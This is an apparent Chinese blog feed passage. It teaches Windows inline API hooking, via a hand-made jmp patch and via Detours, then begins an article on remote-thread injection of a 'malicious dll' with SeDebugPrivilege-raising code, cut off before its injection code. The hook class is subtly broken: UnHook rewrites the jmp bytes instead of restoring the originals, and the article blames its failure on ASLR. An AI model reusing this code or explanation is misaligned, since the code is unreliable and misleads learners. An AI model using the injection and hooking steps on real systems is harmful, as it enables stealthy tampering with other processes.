    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>API函数保存在操作系统的DLL文件中，在运行程序后程序会将API所在的DLL加载入进程中，当在程序中使用某个API函数时。这样程序就会像调用自己的函数一样调用API，大体过程如图1所示。</p><p><a href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p><p>图1 调用API函数的大体过程</p><p>从图1中可以看出，在进程中当EXE模块调用CreateFile()函数的时候，会去调用kernel32.dll模块中的CreateFile()函数，因为真正的CreateFile()函数的实现在kernel32.dll模块中。</p><p>CreateFile()是API函数，API函数也是由人编写的代码再编译而成的，也有其对应的二进制代码。既然是代码，那么就可以被修改。通过一种“野蛮”的方法来直接修改API函数在内存中的映像，从而对API函数进行HOOK。使用的方法是，直接使用汇编指令的jmp指令将其代码执行流程改变，进而执行我们的代码，这样就使原来的函数的流程改变了。执行完我们的流程以后，可以选择性地执行原来的函数，也可以不继续执行原来的函数。</p><p><strong>假设要对某进程的kernel32.dll的CreateFile()函数进行HOOK，首先需要在指定进程中的内存中找到CreateFile()函数的地址，然后修改CreateFile()函数的首地址的代码为jmpMyProc的指令。这样，当指定的进程调用CreateFile()函数时，就会首先跳转到我们的函数当中去执行流程，这样就完成了我们的HOOK了。</strong></p><p><a href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p><p>由于这种方法是在程序流程中直接进行嵌入jmp指令来改变流程的，所以就把它叫做Inline Hook。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>Inline  Hook是在程序中嵌入了jmp指令然后跳转到我们的程序流程中继续执行的，jmp指令的用法是jmp  目的地址，减5是因为jmp xxxx指令机器码长5个字节</p><p><strong>jmp后的偏移量 =  目的地址  -   源地址   -  5</strong></p><p>目的地址：钩子函数地址  源地址：要HOOK的函数地址</p><p>梳理一下我们内联钩子的流程：</p><ul><li>构造jmp指令</li><li>在内存中找到想要HOOK的函数地址，并保存为HOOK位置处的前5个字节</li><li>将构造的跳转指令写入需要HOOK的位置</li><li>当HOOK位置被执行时会跳转到我们的执行流程</li><li>如果要继续原来的流程，那么取消HOOK，也就是还原被修改的字节</li><li>执行原来的流程</li><li>继续HOOK住原来的位置</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>先封装一个CILHook类，</p><p>头文件CILHook.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CILHook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CILHook();</span><br><span class="line">    ~CILHook();</span><br><span class="line"></span><br><span class="line">    <span class="function">BOOL <span class="title">Hook</span><span class="params">(LPCTSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    FARPROC m_pfnOrig;</span><br><span class="line">    BYTE m_bOldBytes[<span class="number">5</span>];</span><br><span class="line">    BYTE m_bNewBytes[<span class="number">5</span>];<span class="comment">//m_bNewBytes[0] = &#x27;\xe9&#x27;，为jmp的机器码，m_bNewBytes为jmp指令</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>CILHook.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CILHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">CILHook::CILHook()</span><br><span class="line">&#123;</span><br><span class="line">    m_pfnOrig = <span class="literal">NULL</span>;</span><br><span class="line">    ZeroMemory(m_bNewBytes, <span class="number">5</span>);</span><br><span class="line">    ZeroMemory(m_bOldBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CILHook::~CILHook() &#123;</span><br><span class="line">    UnHook();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本质就是把User32.dll中的MessageBox的地址换成钩子函数地址</span></span><br><span class="line"><span class="comment">//模块名 pszModuleName, 函数名 pszFuncName, 钩子函数 pfnHookFunc</span></span><br><span class="line"><span class="function">BOOL <span class="title">CILHook::Hook</span><span class="params">(LPCWSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span> </span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="comment">//获取指定模块中函数的地址，User32.dll中的MessageBox</span></span><br><span class="line">    m_pfnOrig = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span> (m_pfnOrig != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//保存该地址处5个字节的内容到m_bOldBytes</span></span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        ReadProcessMemory(GetCurrentProcess(), (LPCVOID)m_pfnOrig, m_bOldBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line"></span><br><span class="line">        m_bNewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xe9&#x27;</span>;<span class="comment">//jmp的机器码</span></span><br><span class="line">        <span class="comment">//pfnhookfunc是HOOK后的目标地址，m_pfnOrig是原来的地址，5是指令长度</span></span><br><span class="line">        *(DWORD*)(m_bNewBytes + <span class="number">1</span>) = (DWORD)pfnHookFunc - (DWORD)m_pfnOrig - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解除Hook</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CILHook::UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (!m_pfnOrig != <span class="number">0</span>) &#123;</span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">CILHook::ReHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (m_pfnOrig != <span class="number">0</span>) &#123;</span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CILHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">CILHook MsgHook;</span><br><span class="line"></span><br><span class="line"><span class="comment">//钩子函数，弹出内容为HOOK的对话框</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(HWND hWnd,LPCWSTR lpText,LPCWSTR lpCaption,UINT uType)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MsgHook.UnHook();</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;Hook&quot;</span>), lpCaption, uType);<span class="comment">//钩子函数弹出Hook</span></span><br><span class="line">MsgHook.ReHook();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//hook后的MessageBox</span></span><br><span class="line">MsgHook.Hook(_T(<span class="string">&quot;User32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>, (FARPROC)MyMessageBoxW);</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;test&quot;</span>), _T(<span class="string">&quot;test&quot;</span>), MB_OK);<span class="comment">//如果成功，弹出的内容不是test而是Hook。</span></span><br><span class="line">MsgHook.UnHook();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>在windows 10中测试失败，仍然执行正常的MessageBox函数，原因是windows 10操作系统中采用ASLR(地址随机化)，用公式计算出来的偏移地址是无效的，所以无法jmp到钩子函数执行。而且在多线程系统中，可能有某个线程就在这个时候调用了修改的系统函数，造成无法预期的结果。在windows 10中，可以使用微软的一个轻量级的开源库——detours来完成Hook。</p><p><a href="https://imgbed.cn/preview?id=601a3f7da9fca800016725f5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/151bc3d1-e336-4f85-b428-f454eb681d39.png" alt="imgbed.cn图床"></a></p><h1 id="使用detours进行API-Hook"><a href="#使用detours进行API-Hook" class="headerlink" title="使用detours进行API Hook"></a>使用detours进行API Hook</h1><p>这里可以使用微软的一个轻量级的开源库来完成Hook。Detours是微软提供的一个开发库，使用它可以简单、高效、稳定地实现API HOOK的功能。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在Visual Studio中选择<code>工具</code>-<code>&gt;NuGet包管理器</code>-&gt;<code>程序包管理器控制台</code></p><p>输入安装命令会自动安装Detours库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Detours</span><br></pre></td></tr></table></figure><p>导入代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;detours.h&gt;</span><br><span class="line">#pragma comment (lib,&quot;detours.lib&quot;)</span><br></pre></td></tr></table></figure><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* OldMesssageBoxA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyFunction0</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> OldMesssageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hooked&quot;</span>, <span class="string">&quot;Warning&quot;</span>, MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line"></span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;test&quot;</span>), _T(<span class="string">&quot;test&quot;</span>), MB_OK);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>成功</p><p><a href="https://imgbed.cn/preview?id=601a3f75355f5d000181d33d"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/091be798-ec28-45b6-98ee-cd0af7262ba4.png" alt="imgbed.cn图床"></a></p><p>具体内容和利用可见</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE/">渗透技巧——从远程桌面客户端提取明文凭据</a></p><p><a href="https://idiotc4t.com/persistence/detous-inline-hook">Detours InLine Hook</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>远程线程注入DLL</title>
    <link href="/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/"/>
    <url>/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在Windows操作系统中，每个进程的内存空间都是被隔离的，但是某些时候需要两个进程协调工作或者是跨进程操作。“远程线程”意思是跨进程，简单来说就是进程A在进程B中创建一个线程，这就叫远程线程。</p><p>DLL文件加载到进程的地址空间中，不会有进程名，隐蔽性较好，方法是强制让某进程加载DLL文件。只要有进程PID，先通过OpenProcess获取该进程句柄，再使用CreateRemoteThread。<strong>每个进程地址空间隔离，新创建的线程函数地址也应该在目的进程中，而不应该在本进程中，同样传递给线程函数的参数也应该在目的进程中，ThreadProc与LoadLibrary除了返回值以外基本相同，返回值的问题可以不考虑。直接把LoadLibrary函数作为线程函数创建到指定进程中。</strong></p><p>LoadLibrary函数在Kernerl32.dll这个系统dll中，而Kernerl32这个DLL文件在任何进程中的加载位置都相同，也就是说<strong>LoadLibrary函数的地址在任何进程中的地址都相同，因此只要在进程中获取LoadLibray函数地址后，该地址在目标进程中也可以用</strong>。使用WriteProcessMemory把要注入的DLL文件写入目标进程，该函数第二个参数需要用VirtualAllocEx在目标进程申请一块内存，然后写入dll文件路径</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>原理：先获取进程句柄（OpenProcess）-&gt;在目标进程申请一块容纳dll文件路径名的内存（VirtualAllocEx）并写入dll路径名（WriteProcessMemory）-&gt;从Kernel32.dll中获取LoadLibraryA函数的地址(GetProcAddress函数)-&gt;在目标进程中创建一个线程（CreateRemoteThread），把线程函数地址(ThreadProc)替换为从Kernel32.dll中获取的LoadLibrary地址加载恶意dll</p><h2 id="调整进程权限"><a href="#调整进程权限" class="headerlink" title="调整进程权限"></a>调整进程权限</h2><p>当前进程权限级别不够时，用OpenProcess()函数打开如smss.exe，winlogon.exe等系统进程时同样会失败，需要调整当前进程为”SeDebugPrivilege”权限。</p><p>调整权限3个步骤，调整权限使当前进程拥有”SeDebugPrivilege”权限，拥有这个权限后，当前进程可以访问一些受限的系统资源。</p><p>（1）使用OpenProcessToken函数打开当前进程的访问令牌</p><p>（2）使用LookupPrivilegeValue()函数取得描述权限的LUID</p><p>（3）使用AdjustTokenPrivileges()函数调整访问令牌的权限。</p><p>调整权限代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">AdjustProcessTokenPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID luidTmp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<span class="comment">//使用OpenProcessToken函数打开当前进程的访问令牌</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))<span class="comment">//使用LookupPrivilegeValue()函数取得描述权限的LUID</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = luidTmp;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))<span class="comment">//使用AdjustTokenPrivileges()函数调整访问令牌的权限。</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h2><h3 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h3><p>有了进程ID后，用此函数获得进程句柄，返回值为进程的句柄，通过此句柄可结束进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,<span class="comment">//进程想要取得的访问权限，PROCESS_ALL_ACCESS</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,<span class="comment">//获取的句柄是否可继承，一般FALSE</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId<span class="comment">//要打开的进程ID号</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="GetProcAddress"><a href="#GetProcAddress" class="headerlink" title="GetProcAddress"></a>GetProcAddress</h3><p>成功返回导出函数或变量的地址,失败返回NULL</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule,<span class="comment">//LoadLibrary返回句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName<span class="comment">//指定要获取函数地址的函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>功能为创建远程线程，相比CreateThread多了一个hProcess参数，该参数指定要创建线程的进程句柄。CreateThread也是依赖于CreateRemoteThread，两个函数都必须传入线程函数参数（ThreadProc）。这里需要给lpStartAddress函数传入LoadLibraryA的地址替代原来调用的线程函数，LoadLibrary通过GetProcAddress函数从Kernel32.dll中获取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                 hProcess,<span class="comment">//OpenProcess打开的线程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                 dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//线程函数地址，传入LoadLibrary，该函数地址位于Kernel32.dll，每个进程中都固定，GetProcAddress获取</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                 lpParameter,<span class="comment">//传给线程函数参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                  dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>在目标进程申请一块内存,返回目标进程申请到的内存块的起始地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,<span class="comment">//指定要申请内存的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,<span class="comment">//指定申请的起始位置  NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,<span class="comment">//指定申请内存的长度    填入申请内存大小，为dll路径的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,<span class="comment">//指定申请内存的状态类型   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect<span class="comment">//指定申请内存的内存属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h3><p>把lpBuffer中的内容写到hProcess指定进程中的lpBaseAddress，使用WriteProcessMemory把要注入的DLL文件路径写入目标进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,<span class="comment">//指定进程的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBaseAddress,<span class="comment">//指定写入内存的起始地址，先用virtualAllocex在目标进程中申请内存，然后写入dll文件路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,<span class="comment">//指定写入内容的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,<span class="comment">//写入内容长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesWritten<span class="comment">//接收实际写入内容长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="CloseHandle"><a href="#CloseHandle" class="headerlink" title="CloseHandle"></a>CloseHandle</h3><p>对打开的句柄进行关闭释放资源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CloseHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hObject</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>恶意dll代码，功能为弹出MessageBox</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span 